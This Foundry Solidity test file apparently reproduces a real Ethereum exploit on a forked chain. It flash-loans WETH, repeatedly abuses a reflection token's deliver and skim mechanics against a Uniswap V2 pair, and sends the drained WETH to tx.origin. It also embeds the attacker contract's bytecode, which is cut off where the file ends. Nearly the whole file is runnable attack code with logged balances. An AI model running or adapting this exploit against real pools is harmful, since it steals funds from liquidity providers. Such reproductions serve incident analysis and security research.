// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0xf72f1d10fc6923f87279ce6c0aef46e372c6652a696f280b0465a301a92f2e26
// https://etherscan.io/address/0x8a4571c3a618e00d04287Ca6385b6b020ce7a305

struct S1 {
    uint256 p1;
    uint256 p2;
    uint256 p3;
    uint256 p4;
    uint256 p5;
    uint256 p6;
    uint256 p7;
    address p8;
    address p9;
}

interface I {
    function deliver(uint256) external payable;
    function skim(address) external payable;
    function reflectionFromToken(uint256, bool) external payable;
    function transfer(address, uint256) external payable;
    function swap(uint256, uint256, address, bytes memory) external payable;
    function balanceOf(address) external payable returns (uint256);
    function transferFrom(address, address, uint256) external payable;
    function flashLoanSimple(address, address, uint256, bytes memory, uint16) external payable;
    function approve(address, uint256) external payable;
    function tokenFromReflection(uint256) external payable;
    function getReserves() external payable returns (uint112, uint112, uint32);
}

contract X52d7 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xf72f1d10fc6923f87279ce6c0aef46e372c6652a696f280b0465a301a92f2e26");
    }

    address constant x111b = 0x111B4B22Ee7eA68703d8e54eA49AA1bb0d158128;
    address constant x1a79 = 0x1a7981D87E3b6a95c1516EB820E223fE979896b3;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x8787 = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xdca7 = 0xDCA79f1f78b866988081DE8a06F92b5e5D316857;
    address constant xfa21 = 0xfA21382cDF68ccA1B3A7107a8Cc80688eefBEEBc;

    uint256 t_uniswapV2Call = 0;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 17221445); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xb72071874c3b301be5a17f9afc26c480f3df013f721f03d69519e37ebd178677));

        // https://explorer.phalcon.xyz/tx/eth/0xb72071874c3b301be5a17f9afc26c480f3df013f721f03d69519e37ebd178677
        this.xb7207187();
        // https://explorer.phalcon.xyz/tx/eth/0xf72f1d10fc6923f87279ce6c0aef46e372c6652a696f280b0465a301a92f2e26
        x4e04e15e();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 17221437); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0xb72071874c3b301be5a17f9afc26c480f3df013f721f03d69519e37ebd178677
        this.xb7207187();
        vm.warp(1683617735);
        vm.roll(17221445);
        // https://explorer.phalcon.xyz/tx/eth/0xf72f1d10fc6923f87279ce6c0aef46e372c6652a696f280b0465a301a92f2e26
        x4e04e15e();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 17221445); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1683617735);
        vm.roll(17221446);
        // https://explorer.phalcon.xyz/tx/eth/0xf72f1d10fc6923f87279ce6c0aef46e372c6652a696f280b0465a301a92f2e26
        vm.deal(RECEIVER, 10 ether);
        {
            address token = address(0x1a7981D87E3b6a95c1516EB820E223fE979896b3);
            uint256 target = 1000000000000000000000000;
            uint256 snap = vm.snapshotState();
            bool found = false;
            uint256 foundSlot = type(uint256).max;
            for (uint256 slot = 0; slot < 100; slot++) {
                vm.revertToState(snap);
                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(slot))), bytes32(uint256(target)));
                uint256 bal = IERC20(token).balanceOf(RECEIVER);
                if (bal != target) continue;
                found = true;
                foundSlot = slot;
                break;
            }
            if (!found) {
                vm.revertToState(snap);
            } else {
                emit log_named_address("GF_SLOT_CACHE_TOKEN", token);
                emit log_named_uint("GF_SLOT_CACHE_SLOT", foundSlot);
                emit log_named_uint("GF_SLOT_CACHE_IS_VYPER", 0);
                vm.revertToState(snap);
                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(foundSlot))), bytes32(uint256(target)));
                require(IERC20(token).balanceOf(RECEIVER) == target, "GF: final store failed");
            }
        }
        vm.store(
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            keccak256(abi.encode(RECEIVER, uint256(3))),
            bytes32(uint256(1000000000000000000000000))
        );
        x4e04e15e();
    }

    function xb7207187() public {
        _constructor_();
    }

    function x4e04e15e() public {
        I(xc02a).approve(x8787, type(uint256).max);
        I(xc02a).approve(x111b, type(uint256).max);
        I(x8787).flashLoanSimple(r, xc02a, 600000000000000000000, hex"00", 0);
        // uint256 v1 = 10217420526464797313;
        uint256 v1 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "10217420526464797313 (10.2174 ether)");
        I(xc02a).transfer(tx.origin, v1);
    }

    function executeOperation(address, uint256, uint256, address, bytes memory) public {
        I(xc02a).transfer(xdca7, 6483429314094222605);
        I(xdca7).swap(100010000000000000000, 0, r, "");
        I(x1a79).transfer(xfa21, 1);
        I(x1a79).reflectionFromToken(1000000000000000000000, false);
        // uint256 v1 = 90918273654821873556;
        uint256 v1 = I(x1a79).balanceOf(r);
        console2.log("I(x1a79).balanceOf(r)\t\t->", "90918273654821873556 (90.9182 ether)");
        I(x1a79).reflectionFromToken(v1, false);
        I(x1a79).tokenFromReflection(1641687142754276176322681536201406618280144403569823207400000000000000000000);
        I(xdca7).swap(100000000000000000000, 0, r, hex"00");
        I(x1a79).transfer(xfa21, 1);
        // uint256 v2 = 101020304060913192840;
        uint256 v2 = I(x1a79).balanceOf(r);
        console2.log("I(x1a79).balanceOf(r)\t\t->", "101020304060913192840 (101.2030 ether)");
        I(x1a79).reflectionFromToken(v2, false);
        I(x1a79).tokenFromReflection(1641687142754276176322681536201406618280144403569823207400000000000000000000);
        I(xdca7).swap(111111111111111111111, 0, r, hex"00");
        I(x1a79).transfer(xfa21, 1);
        // uint256 v3 = 113647842068527341944;
        uint256 v3 = I(x1a79).balanceOf(r);
        console2.log("I(x1a79).balanceOf(r)\t\t->", "113647842068527341944 (113.6478 ether)");
        I(x1a79).reflectionFromToken(v3, false);
        I(x1a79).tokenFromReflection(1641687142754276176322681536201406618280144403569823207400000000000000000000);
        I(xdca7).swap(124999999999999999999, 0, r, hex"00");
        I(x1a79).transfer(xfa21, 1);
        // uint256 v4 = 129883248078316962222;
        uint256 v4 = I(x1a79).balanceOf(r);
        console2.log("I(x1a79).balanceOf(r)\t\t->", "129883248078316962222 (129.8832 ether)");
        I(x1a79).reflectionFromToken(v4, false);
        I(x1a79).tokenFromReflection(1641687142754276176322681536201406618280144403569823207400000000000000000000);
        I(xdca7).swap(142857142857142857142, 0, r, hex"00");
        I(x1a79).transfer(xfa21, 1);
        I(x1a79).tokenFromReflection(1641687142754276176322681536201406618280144403569823207400000000000000000000);
        I(xdca7).swap(166666666666666666665, 0, r, hex"00");
        I(x1a79).transfer(xfa21, 1);
        I(x1a79).tokenFromReflection(1641687142754276176322681536201406618280144403569823207400000000000000000000);
        I(xdca7).swap(202786526536168850335, 0, r, hex"00");
        I(x1a79).transfer(xfa21, 1);
        {
            I(x1a79).tokenFromReflection(656674857101710470529072614480562647312057761427929282960000000000000000000);
            I(xdca7).swap(102943992661677331150, 0, r, hex"00");
            I(x1a79).transfer(xfa21, 1);
            // uint112 v5 = 997324024993068247101;
            // uint112 v6 = 59252462988780204138;
            // uint32 v7 = 1683617735;
            (uint112 v5, uint112 v6, uint32 v7) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v5, v6, v7);
            I(xc02a).transfer(xdca7, 6623109779658795300);
            I(xdca7).swap(100000000000000000000, 0, r, "");
            I(x1a79).transfer(xfa21, 1);
            I(x1a79).reflectionFromToken(1000000000000000000000, false);
            I(x1a79).tokenFromReflection(565356301401149046204111823293836681126767604389569435400000000000000000000);
            I(xdca7).swap(100000000000000000000, 0, r, hex"00");
            I(x1a79).transfer(xfa21, 1);
            I(x1a79).tokenFromReflection(565356301401149046204111823293836681126767604389569435400000000000000000000);
            I(xdca7).swap(112291979354054510036, 0, r, hex"00");
            I(x1a79).transfer(xfa21, 1);
            I(x1a79).tokenFromReflection(565356301401149046204111823293836681126767604389569435400000000000000000000);
            I(xdca7).swap(127800736096634619123, 0, r, hex"00");
            I(x1a79).transfer(xfa21, 1);
            I(x1a79).tokenFromReflection(565356301401149046204111823293836681126767604389569435400000000000000000000);
            I(xdca7).swap(147950506783175623646, 0, r, hex"00");
            I(x1a79).transfer(xfa21, 1);
            I(x1a79).tokenFromReflection(565356301401149046204111823293836681126767604389569435400000000000000000000);
            I(xdca7).swap(175120546965434120630, 0, r, hex"00");
            I(x1a79).transfer(xfa21, 1);
            // uint112 v8 = 996423933271347347705;
            // uint112 v9 = 60082797814487225195;
            // uint32 v10 = 1683617735;
            (uint112 v8, uint112 v9, uint32 v10) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v8, v9, v10);
            I(xc02a).transfer(xdca7, 3183752357779283556);
            I(xdca7).swap(50000000000000000000, 0, r, "");
            I(x1a79).transfer(xfa21, 1);
            I(x1a79).reflectionFromToken(1000000000000000000000, false);
            I(x1a79).tokenFromReflection(263355561966926778552222853940372062899249669241865617000000000000000000000);
            I(xdca7).swap(100000000000000000000, 0, r, hex"00");
        }
        {
            I(x1a79).transfer(xfa21, 1);
            I(x1a79).tokenFromReflection(263355561966926778552222853940372062899249669241865617000000000000000000000);
            I(xdca7).swap(111715543090618080206, 0, r, hex"00");
            I(x1a79).transfer(xfa21, 1);
            I(x1a79).tokenFromReflection(263355561966926778552222853940372062899249669241865617000000000000000000000);
            I(xdca7).swap(126347896830366119205, 0, r, hex"00");
            I(x1a79).transfer(xfa21, 1);
            // uint112 v11 = 995656862065292326577;
            // uint112 v12 = 60519255270718605384;
            // uint32 v13 = 1683617735;
            (uint112 v11, uint112 v12, uint32 v13) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v11, v12, v13);
            I(xc02a).transfer(xdca7, 306369246876342679);
            I(xdca7).swap(5000000000000000000, 0, r, "");
            I(x1a79).transfer(xfa21, 1);
            I(x1a79).reflectionFromToken(1000000000000000000000, false);
            I(x1a79).tokenFromReflection(108848062795832822561335478878703002119270856316902193880000000000000000000);
            I(xdca7).swap(60000000000000000000, 0, r, hex"00");
            I(x1a79).transfer(xfa21, 1);
            // uint112 v14 = 998244837212532049410;
            // uint112 v15 = 60407167148429994109;
            // uint32 v16 = 1683617735;
            (uint112 v14, uint112 v15, uint32 v16) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v14, v15, v16);
            I(xc02a).transfer(xdca7, 547123542983328357146);
            I(xdca7).swap(898719826942442604083, 0, xfa21, "");
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
        }
        {
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).transferFrom(r, xfa21, 1);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
        }
        {
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).transferFrom(r, xfa21, 1);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
        }
        {
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).transferFrom(r, xfa21, 1);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
        }
        {
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(500000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(500000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(500000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(50000000000000000000);
            I(xdca7).skim(xfa21);
            I(x1a79).deliver(900000000000000000000);
            I(x1a79).deliver(300000000000000000000);
            I(x1a79).deliver(100000000000000000000);
            I(x1a79).deliver(20000000000000000000);
            // uint256 v17 = 1990533268585091390453;
            uint256 v17 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "1990533268585091390453 (1990.5332 ether)");
            // uint112 v18 = 99526663429254569522;
            // uint112 v19 = 607520649190005784448;
            // uint32 v20 = 1683617735;
            (uint112 v18, uint112 v19, uint32 v20) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v18, v19, v20);
            I(xdca7).swap(0, 577057797603483907877, r, "");
        }

        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function uniswapV2Call(address, uint256, uint256, bytes memory) public {
        t_uniswapV2Call++;

        if (t_uniswapV2Call == 1) {
            // uint256 v1 = 182745730964466538945;
            uint256 v1 = I(x1a79).balanceOf(r);
            console2.log("I(x1a79).balanceOf(r)\t\t->", "182745730964466538945 (182.7457 ether)");
            I(x1a79).reflectionFromToken(v1, false);
            I(x1a79).tokenFromReflection(1477518428478848558683025790438871713658677896299934556830225460133174495441);
            I(x1a79).deliver(90909090909090909090);
            // uint256 v2 = 914358741035944089039;
            uint256 v2 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "914358741035944089039 (914.3587 ether)");
            // uint112 v3 = 922922866932349680136;
            // uint112 v4 = 63797368495968861124;
            // uint32 v5 = 1683617735;
            (uint112 v3, uint112 v4, uint32 v5) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v3, v4, v5);
            I(xc02a).transfer(xdca7, 619119311350881749);
            return;
        }
        if (t_uniswapV2Call == 2) {
            // uint256 v1 = 203278959162721206243;
            uint256 v1 = I(x1a79).balanceOf(r);
            console2.log("I(x1a79).balanceOf(r)\t\t->", "203278959162721206243 (203.2789 ether)");
            I(x1a79).reflectionFromToken(v1, false);
            I(x1a79).tokenFromReflection(1477518428478848558696657176748831261652960358126430164276035623569125546078);
            I(x1a79).deliver(101123595505617977528);
            // uint256 v2 = 916153583665437100168;
            uint256 v2 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "916153583665437100168 (916.1535 ether)");
            // uint112 v3 = 925469852147055200150;
            // uint112 v4 = 63645401381997838802;
            // uint32 v5 = 1683617735;
            (uint112 v3, uint112 v4, uint32 v5) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v3, v4, v5);
            I(xc02a).transfer(xdca7, 671221905273789546);
            return;
        }
        if (t_uniswapV2Call == 3) {
            // uint256 v1 = 229010472980787181715;
            uint256 v1 = I(x1a79).balanceOf(r);
            console2.log("I(x1a79).balanceOf(r)\t\t->", "229010472980787181715 (229.1047 ether)");
            I(x1a79).reflectionFromToken(v1, false);
            I(x1a79).tokenFromReflection(1477518428478848558689466469551912451376244771881969237303449130236632091905);
            I(x1a79).deliver(113924050632911392404);
            // uint256 v2 = 918461238474785257335;
            uint256 v2 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "918461238474785257335 (918.4612 ether)");
            // uint112 v3 = 928653583665437100168;
            // uint112 v4 = 63453461500805732310;
            // uint32 v5 = 1683617735;
            (uint112 v3, uint112 v4, uint32 v5) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v3, v4, v5);
            I(xc02a).transfer(xdca7, 730993981407253451);
            return;
        }
        if (t_uniswapV2Call == 4) {
            // uint256 v1 = 262200396601191121094;
            uint256 v1 = I(x1a79).balanceOf(r);
            console2.log("I(x1a79).balanceOf(r)\t\t->", "262200396601191121094 (262.2003 ether)");
            I(x1a79).reflectionFromToken(v1, false);
            I(x1a79).tokenFromReflection(1477518428478848558687469700935711671220220783953003530380358752224537350782);
            I(x1a79).deliver(130434782608695652173);
            // uint256 v2 = 921538111553916133555;
            uint256 v2 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "921538111553916133555 (921.5381 ether)");
            // uint112 v3 = 932746952760499543048;
            // uint112 v4 = 63204326806333349468;
            // uint32 v5 = 1683617735;
            (uint112 v3, uint112 v4, uint32 v5) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v3, v4, v5);
            I(xc02a).transfer(xdca7, 798838197250184532);
            return;
        }
        if (t_uniswapV2Call == 5) {
            // uint256 v1 = 784615028698897762938;
            uint256 v1 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "784615028698897762938 (784.6150 ether)");
            // uint112 v2 = 938204778220582800221;
            // uint112 v3 = 62869536221674634480;
            // uint32 v4 = 1683617735;
            (uint112 v2, uint112 v3, uint32 v4) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v2, v3, v4);
            I(x1a79).deliver(164187442238681304855);
            return;
        }
        if (t_uniswapV2Call == 6) {
            // uint256 v1 = 771890222214216176723;
            uint256 v1 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "771890222214216176723 (771.8902 ether)");
            // uint112 v2 = 959023855047379785127;
            // uint112 v3 = 61544057831196469068;
            // uint32 v4 = 1683617735;
            (uint112 v2, uint112 v3, uint32 v4) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v2, v3, v4);
            I(x1a79).deliver(195741779943489134390);
            return;
        }
        if (t_uniswapV2Call == 7) {
            // uint256 v1 = 891726011018581298100;
            uint256 v1 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "891726011018581298100 (891.7260 ether)");
            // uint112 v2 = 985490220086806266041;
            // uint112 v3 = 59941535795481868188;
            // uint32 v4 = 1683617735;
            (uint112 v2, uint112 v3, uint32 v4) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v2, v3, v4);
            I(x1a79).deliver(95451964831453017363);
            return;
        }
        if (t_uniswapV2Call == 8) {
            // uint256 v1 = 824736276903446839201;
            uint256 v1 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "824736276903446839201 (824.7362 ether)");
            // uint112 v2 = 916488914134412370809;
            // uint112 v3 = 65151684544325152068;
            // uint32 v4 = 1683617735;
            (uint112 v2, uint112 v3, uint32 v4) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v2, v3, v4);
            I(x1a79).deliver(100469137767907257110);
            return;
        }
        if (t_uniswapV2Call == 9) {
            // uint256 v1 = 825053470193404011748;
            uint256 v1 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "825053470193404011748 (825.5347 ether)");
            // uint112 v2 = 928080760823363646648;
            // uint112 v3 = 64365726181727977348;
            // uint32 v4 = 1683617735;
            (uint112 v2, uint112 v3, uint32 v4) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v2, v3, v4);
            I(x1a79).deliver(111372501170986365326);
            return;
        }
        if (t_uniswapV2Call == 10) {
            // uint256 v1 = 823967887693983705441;
            uint256 v1 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "823967887693983705441 (823.9678 ether)");
            // uint112 v2 = 941238253533890296232;
            // uint112 v3 = 63494358780620377508;
            // uint32 v4 = 1683617735;
            (uint112 v2, uint112 v3, uint32 v4) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v2, v3, v4);
            I(x1a79).deliver(125010209985340425783);
            return;
        }
        if (t_uniswapV2Call == 11) {
            // uint256 v1 = 820675046884828259812;
            uint256 v1 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "820675046884828259812 (820.6750 ether)");
            // uint112 v2 = 956483624758912207817;
            // uint112 v3 = 62515118270199999694;
            // uint32 v4 = 1683617735;
            (uint112 v2, uint112 v3, uint32 v4) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v2, v3, v4);
            I(x1a79).deliver(142463198189914061457);
            return;
        }
        if (t_uniswapV2Call == 12) {
            // uint256 v1 = 813654647968067423335;
            uint256 v1 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "813654647968067423335 (813.6546 ether)");
            // uint112 v2 = 974526430234187972235;
            // uint112 v3 = 61395043250603239208;
            // uint32 v4 = 1683617735;
            (uint112 v2, uint112 v3, uint32 v4) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v2, v3, v4);
            I(x1a79).deliver(165537063951838044818);
            return;
        }
        if (t_uniswapV2Call == 13) {
            // uint256 v1 = 864853492991571339225;
            uint256 v1 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "864853492991571339225 (864.8534 ether)");
            // uint112 v2 = 956204958061655625833;
            // uint112 v3 = 62935058905388946997;
            // uint32 v4 = 1683617735;
            (uint112 v2, uint112 v3, uint32 v4) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v2, v3, v4);
            I(x1a79).deliver(95827686858518416651);
            return;
        }
        if (t_uniswapV2Call == 14) {
            // uint256 v1 = 865640580846879807141;
            uint256 v1 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "865640580846879807141 (865.6405 ether)");
            // uint112 v2 = 967685573176439160838;
            // uint112 v3 = 62210652673776252323;
            // uint32 v4 = 1683617735;
            (uint112 v2, uint112 v3, uint32 v4) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v2, v3, v4);
            I(x1a79).deliver(105820657045753049783);
            return;
        }
        if (t_uniswapV2Call == 15) {
            // uint256 v1 = 865303672689957903543;
            uint256 v1 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "865303672689957903543 (865.3036 ether)");
            // uint112 v2 = 980718639603927253341;
            // uint112 v3 = 61411554222176528952;
            // uint32 v4 = 1683617735;
            (uint112 v2, uint112 v3, uint32 v4) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v2, v3, v4);
            I(x1a79).deliver(118069511152990644843);
            return;
        }
        if (t_uniswapV2Call == 16) {
            // uint256 v1 = 937276346488427640960;
            uint256 v1 = I(x1a79).balanceOf(xdca7);
            console2.log("I(x1a79).balanceOf(xdca7)\t->", "937276346488427640960 (937.2763 ether)");
            // uint112 v2 = 991652688409497075114;
            // uint112 v3 = 60795032367279744856;
            // uint32 v4 = 1683617735;
            (uint112 v2, uint112 v3, uint32 v4) = I(xdca7).getReserves();
            console2.log("I(xdca7).getReserves()\t->", v2, v3, v4);
            I(x1a79).deliver(55028858024122267363);
            return;
        }
    }

    function _constructor_() public {
        I(x1a79).approve(r, type(uint256).max);

        bytes memory rt = abi.encodePacked(
            hex"608060405234801561001057600080fd5b50600436106100935760003560e01c",
            hex"8063622a69c611610066578063622a69c61461011c5780639b23cfcd1461013a",
            hex"5780639e3b34bf14610144578063b0829d2814610162578063f7971172146101",
            hex"7e57610093565b80630a00efe11461009857806310d1e85c146100b45780631b",
            hex"11d0ff146100d05780634e04e15e14610100575b600080fd5b6100b260048036",
            hex"038101906100ad9190612ae1565b61019c565b005b6100ce6004803603810190",
            hex"6100c99190612bd1565b610246565b005b6100ea60048036038101906100e591",
            hex"90612c59565b6109bb565b6040516100f79190612d0e565b60405180910390f3",
            hex"5b61011a60048036038101906101159190612d55565b610a71565b005b610124",
            hex"610ecf565b6040516101319190612db7565b60405180910390f35b610142610e",
            hex"d5565b005b61014c611d83565b6040516101599190612db7565b604051809103",
            hex"90f35b61017c60048036038101906101779190612ae1565b611d89565b005b61",
            hex"0186611ee2565b6040516101939190612db7565b60405180910390f35b600360",
            hex"009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16",
            hex"73ffffffffffffffffffffffffffffffffffffffff16633bd5d1736103e88360",
            hex"06546101eb9190612e01565b6101f59190612e72565b6040518263ffffffff16",
            hex"60e01b81526004016102119190612db7565b600060405180830381600087803b",
            hex"15801561022b57600080fd5b505af115801561023f573d6000803e3d6000fd5b",
            hex"5050505050565b600560015411610769576000600360009054906101000a9004",
            hex"73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffff",
            hex"ffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81",
            hex"526004016102ad9190612eb2565b602060405180830381865afa1580156102ca",
            hex"573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040",
            hex"52508101906102ee9190612ee2565b90506000600360009054906101000a9004",
            hex"73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffff",
            hex"ffffffffffffffffffffff16634549b0398360006040518363ffffffff1660e0",
            hex"1b8152600401610350929190612f0f565b602060405180830381865afa158015",
            hex"61036d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201",
            hex"80604052508101906103919190612ee2565b90506000600854826103a3919061",
            hex"2f38565b90506000600360009054906101000a900473ffffffffffffffffffff",
            hex"ffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff",
            hex"16632d838119836040518263ffffffff1660e01b81526004016104029190612d",
            hex"b7565b602060405180830381865afa15801561041f573d6000803e3d6000fd5b",
            hex"505050506040513d601f19601f82011682018060405250810190610443919061",
            hex"2ee2565b9050600360009054906101000a900473ffffffffffffffffffffffff",
            hex"ffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663",
            hex"3bd5d173826040518263ffffffff1660e01b81526004016104a09190612db756",
            hex"5b600060405180830381600087803b1580156104ba57600080fd5b505af11580",
            hex"156104ce573d6000803e3d6000fd5b505050506000600360009054906101000a",
            hex"900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffff",
            hex"ffffffffffffffffffffffffff166370a08231600260009054906101000a9004",
            hex"73ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff16",
            hex"60e01b81526004016105519190612eb2565b602060405180830381865afa1580",
            hex"1561056e573d6000803e3d6000fd5b505050506040513d601f19601f82011682",
            hex"0180604052508101906105929190612ee2565b90506000806002600090549061",
            hex"01000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffff",
            hex"ffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff16",
            hex"60e01b8152600401606060405180830381865afa158015610604573d6000803e",
            hex"3d6000fd5b505050506040513d601f19601f8201168201806040525081019061",
